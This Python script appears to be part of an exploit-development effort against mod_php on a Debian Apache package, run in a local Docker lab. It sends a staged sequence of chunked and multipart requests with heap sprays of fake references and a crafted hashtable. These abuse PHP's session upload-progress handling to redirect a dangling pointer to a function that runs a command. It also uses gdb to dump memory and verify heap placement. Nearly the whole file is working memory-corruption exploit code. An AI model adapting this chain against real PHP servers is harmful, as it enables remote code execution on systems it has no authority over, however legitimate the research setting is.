#!/usr/bin/env python3
"""Debian package: full A1/B1/A2 order, then rc=2 B2 forced onto the A2 child.

Dumps the A2 child's 2MiB chunk and the memory at its dangling hsv pointer, so
the real `ht` placement (S) and the fake-reference spray coverage can be read
directly instead of assumed.
"""
import json, os, subprocess, sys, time

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D, "scripts"))
sys.path.insert(0, "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure")
import chain84 as C
from fake_ref_b import make_spray, make_name
from mk_ht import build as build_ht

CNAME = "m109-d8424pkg"
PORT = 18740
LOG = "/var/log/apache2/p2s-access.log"
BOUND = b"C" * 10
S_OFF = 0xF8398
ZIF_OFF = 0x24CDD0
ZDTOR_OFF = 0x424FF0


def sh(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def pids():
    r = sh(["docker", "exec", CNAME, "sh", "-c",
            "ps -eo pid,user,comm | awk '$2==\"www-data\"&&$3==\"apache2\"{print $1}'"])
    return [int(x) for x in r.stdout.split()]


def state(pid):
    r = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", "/tmp/deb_state.gdb"])
    for line in r.stdout.splitlines():
        if line.startswith("DEBSTATE"):
            return dict(kv.split("=", 1) for kv in line.split()[1:])
    return {"err": (r.stdout + r.stderr).strip()[-200:]}


def log_lines():
    return sh(["docker", "exec", CNAME, "sh", "-c", "cat %s 2>/dev/null" % LOG]).stdout.splitlines()


def diag_b2(S, zif, cmd, rc=2, n1=500, n2=495, vl=384):
    spray = make_spray(vl, S, rc, 0x0107, 8, 32)
    ht = build_ht(S, zif, cmd.encode(), 384)

    def part(name, value):
        return (b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")
    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + BOUND + b"--\r\n"
    return bytes(body)


def dump(pid, outdir):
    chunk = os.path.join(outdir, "chunk_%d.bin" % pid)
    hsvbin = os.path.join(outdir, "hsv_%d.bin" % pid)
    script = """set pagination off
set confirm off
python
import gdb
inf=gdb.selected_inferior()
def u64(a): return int.from_bytes(inf.read_memory(a,8).tobytes(),'little')
ag=int(gdb.parse_and_eval('&alloc_globals'))&0xffffffffffffffff
ps=int(gdb.parse_and_eval('&ps_globals'))&0xffffffffffffffff
h=u64(ag); m=h&~0x1fffff
hsv=u64(ps+0x168)
gdb.execute('dump memory /tmp/chunk.bin %#x %#x' % (m, m+0x200000))
if hsv and (m <= hsv < m+0x200000):
    gdb.execute('dump memory /tmp/hsv.bin %#x %#x' % (hsv-0x40, hsv+0xC0))
    print('HSV %#x HSVVAL %#x' % (hsv, u64(hsv)), flush=True)
print('HEAP %#x MAIN %#x' % (h, m), flush=True)
end
quit
"""
    lp = os.path.join(outdir, "dump.gdb")
    open(lp, "w").write(script)
    sh(["docker", "cp", lp, CNAME + ":/tmp/dump.gdb"])
    sh(["docker", "exec", CNAME, "sh", "-c", "rm -f /tmp/chunk.bin /tmp/hsv.bin"])
    p = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", "/tmp/dump.gdb"])
    print("dump:", [l for l in p.stdout.splitlines() if l.startswith(("HEAP", "HSV"))], flush=True)
    ok = sh(["docker", "cp", "%s:/tmp/chunk.bin" % CNAME, chunk]).returncode == 0
    ok_h = sh(["docker", "cp", "%s:/tmp/hsv.bin" % CNAME, hsvbin]).returncode == 0
    return (chunk if ok else None), (hsvbin if ok_h else None)


def main():
    outdir = os.path.join(D, "out/debdiag3")
    os.makedirs(outdir, exist_ok=True)
    rec = {}
    print("== restart", flush=True)
    sh(["docker", "restart", CNAME])
    time.sleep(2.0)

    # A1
    n = len(log_lines())
    pr = C.send_chunked(PORT, "/index.php?q0000000=v", os.path.join(D, "bodies/a1.bin"),
                        os.path.join(outdir, "a1.resp"))
    pr.wait(timeout=300)
    a1 = open(os.path.join(outdir, "a1.resp"), "rb").read()
    time.sleep(0.2)
    a1log = log_lines()[n:]
    print("A1", a1.split(b"\r\n", 1)[0], a1log, flush=True)

    # B1 x5
    n = len(log_lines())
    procs = []
    for i in range(5):
        s = os.path.join(outdir, "b1_%d.resp" % i)
        procs.append(C.send_chunked(PORT, "/index.php", os.path.join(D, "bodies/b1.bin"), s))
    for p in procs:
        try:
            p.wait(timeout=300)
        except subprocess.TimeoutExpired:
            p.kill()
    time.sleep(0.3)
    b1log = log_lines()[n:]
    print("B1", b1log, flush=True)

    # A2
    n = len(log_lines())
    a2 = C.a2_body()
    r = C.send_plain(PORT, "/index.php", a2)
    time.sleep(0.3)
    a2log = log_lines()[n:]
    a2pid = int(a2log[-1].split()[0]) if a2log else None
    st = state(a2pid) if a2pid else None
    print("A2", r.split(b"\r\n", 1)[0], a2log, st, flush=True)
    rec["a2"] = {"pid": a2pid, "log": a2log, "state": st}
    if not st or st.get("hsv") in (None, "0x0"):
        print("A2 child has no hsv; abort", flush=True)
        return 3
    main = int(st["main"], 16)
    lib = int(st["lib"], 16)
    hsv = int(st["hsv"], 16)
    S = main + S_OFF
    zif = lib + ZIF_OFF
    cmd = "DEBMARK_%x" % (int(time.time()) & 0xFFFFFF)
    rec["S"] = hex(S); rec["zif"] = hex(zif); rec["hsvoff"] = hex(hsv - main); rec["cmd"] = cmd
    print("main=%#x lib=%#x hsv=%#x (off %#x) S=%#x zif=%#x" % (main, lib, hsv, hsv - main, S, zif), flush=True)

    body = diag_b2(S, zif, cmd, rc=2)
    rec["b2_bytes"] = len(body)
    hit_pid = None
    logs = []
    for k in range(8):
        n = len(log_lines())
        resp = C.send_plain(PORT, "/index.php", body, timeout=300)
        time.sleep(0.25)
        lg = log_lines()[n:]
        logs.append(lg)
        pid = int(lg[-1].split()[0]) if lg else None
        print("diagB2 try %d pid=%s status=%s log=%s" % (k, pid, resp.split(b"\r\n", 1)[0], lg), flush=True)
        if pid == a2pid:
            hit_pid = pid
            break
    rec["b2_logs"] = logs
    rec["b2_hit_pid"] = hit_pid
    if hit_pid:
        chunk, hsvbin = dump(hit_pid, outdir)
        rec["chunk"] = chunk
        rec["hsvbin"] = hsvbin
        rec["after"] = state(hit_pid)
        print("after:", rec["after"], flush=True)
    json.dump(rec, open(os.path.join(outdir, "diag3.json"), "w"), indent=1)
    print("saved", os.path.join(outdir, "diag3.json"), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
